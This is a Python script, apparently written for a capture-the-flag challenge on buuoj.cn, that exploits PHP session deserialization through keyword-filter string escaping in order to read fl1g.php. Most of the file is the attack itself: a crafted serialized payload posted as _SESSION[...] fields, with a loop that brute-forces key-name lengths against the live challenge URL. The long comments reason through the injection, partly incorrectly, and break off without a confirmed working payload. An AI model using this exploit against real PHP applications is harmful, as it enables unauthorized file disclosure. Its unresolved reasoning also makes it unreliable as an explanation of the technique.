import requests
import base64
import time

url = "http://4079c9cb-e2e3-4d7b-9bc1-a686b76e15a2.node5.buuoj.cn:81/index.php"

# Target file: fl1g.php (note: it's digit 1, not letter l)
target = "fl1g.php"
target_b64 = base64.b64encode(target.encode()).decode()  # ZmwxZy5waHA=

print(f"Target file: {target}")
print(f"Base64 encoded: {target_b64}")

# Injection payload to add a new img key
inject = '";s:3:"img";s:9:"' + target_b64 + '";}'
print(f"Injection: {inject}")
print(f"Injection length: {len(inject)}")

session = requests.Session()

# The key insight from the hint:
# Key name escape: use filter keywords in the KEY NAME
# 
# When we POST _SESSION[flagphp]=xxx:
# - The key name "flagphp" (7 bytes) contains "flag" (4 bytes) and "php" (3 bytes)
# - After filter: '' (0 bytes)
# - Serialized: s:7:"flagphp";s:N:"xxx";
# - After filter: s:7:"";s:N:"xxx";
# - PHP reads 7 bytes from "" (empty), reading from the separator ";s:N:"
# - The 7 bytes become the KEY NAME
# - The remaining content becomes the KEY VALUE

# Let me calculate:
# inject = ";s:3:"img";s:9:"ZmwxZy5waHA=";} (32 bytes)
# 
# Serialized: s:7:"flagphp";s:32:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# After filter: s:7:"";s:32:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads 7 bytes from "":
# Content after "": ";s:32:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# First 7 bytes: ";s:32:" (7 bytes)
# KEY NAME = ";s:32:"
# 
# Then PHP expects KEY VALUE.
# Next chars: ";s:3:"img";s:9:"ZmwxZy5waHA=";}"
# 
# PHP reads: " (opening quote)
# Then reads VALUE content: ;s:3:"img";s:9:"ZmwxZy5waHA=";}
# 
# But this doesn't start with s:N:"..." format!

# I think the issue is that the VALUE format is wrong.

# Let me think about this differently.
# 
# The goal is to inject a new img key-value pair into the session.
# 
# The session structure is: {user, function, img}
# 
# We want to add: img = target_b64
# 
# The injection: ";s:3:"img";s:9:"ZmwxZy5waHA=";}
# 
# This injection:
# - " closes the current VALUE
# - ; separates KEY and VALUE
# - s:3:"img" is the new KEY
# - ; separates KEY and VALUE
# - s:9:"ZmwxZy5waHA=" is the new VALUE
# - "; closes the VALUE
# - } closes the array

# But for this to work, the injection needs to be parsed as separate elements,
# not as part of the current VALUE!

# The key name escape should help with this.
# 
# When the key name shrinks, PHP reads extra bytes from the separator.
# These extra bytes become part of the KEY NAME.
# 
# The remaining content (our injection) becomes the KEY VALUE.
# 
# But the KEY VALUE should be a valid serialized string!

# Let me trace through more carefully:
# 
# Serialized: a:4:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:7:"flagphp";s:32:";s:3:"img";s:9:"ZmwxZy5waHA=";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
# 
# Wait, this has 4 elements, but the array count might be different!

# Let me think about the session structure after extract():
# 
# Original session: {user: guest, function: show_image, img: base64(guest_img.png)}
# 
# After POST _SESSION[flagphp]=inject:
# - extract() overwrites/adds to $_SESSION
# - $_SESSION['flagphp'] = inject
# 
# Session: {user: guest, function: show_image, img: base64(guest_img.png), flagphp: inject}
# 
# Serialized: a:4:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";s:7:"flagphp";s:32:";s:3:"img";s:9:"ZmwxZy5waHA=";}"}
# 
# After filter: a:4:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";s:7:"";s:32:";s:3:"img";s:9:"ZmwxZy5waHA=";}"}
# 
# PHP parses:
# a:4:{ - array with 4 elements
# s:4:"user" - key 1
# s:5:"guest" - value 1
# s:8:"function" - key 2
# s:10:"show_image" - value 2
# s:3:"img" - key 3
# s:20:"Z3Vlc3RfaW1nLnBuZw==" - value 3
# s:7:"" - key 4 (empty string, but length says 7)
#   PHP reads 7 bytes from "" (empty)
#   Content after "": ";s:32:";s:3:"img";s:9:"ZmwxZy5waHA=";}"
#   PHP reads 7 bytes: ";s:32:" (7 bytes)
#   KEY NAME = ";s:32:"
#   
#   Then PHP expects KEY VALUE.
#   Next chars: ";s:3:"img";s:9:"ZmwxZy5waHA=";}"
#   
#   PHP reads: " (opening quote)
#   Then reads VALUE content: ;s:3:"img";s:9:"ZmwxZy5waHA=;}
#   
#   Wait, this is not a valid serialized string!

# I think I need to adjust the injection.

# Let me try a different approach:
# What if the injection starts with a valid serialized string?
# 
# injection = s:28:";s:3:"img";s:9:"ZmwxZy5waHA=";}"; (but this has nested quotes!)

# Actually, let me just test different key name lengths and see what happens.

for num_flags in range(1, 15):
    key_name = "flag" * num_flags
    inject = '";s:3:"img";s:9:"' + target_b64 + '";}'
    
    data = {
        '_SESSION[' + key_name + ']': inject
    }
    
    print(f"\n=== num_flags={num_flags}, key_name_len={len(key_name)} ===")
    
    r = session.post(url + "?f=show_image", data=data)
    
    if r.text.strip():
        print(f"Response: {r.text[:200]}")
        if "flag{" in r.text.lower() or "FLAG{" in r.text.lower():
            print("FOUND FLAG!")
            break
    
    time.sleep(0.3)

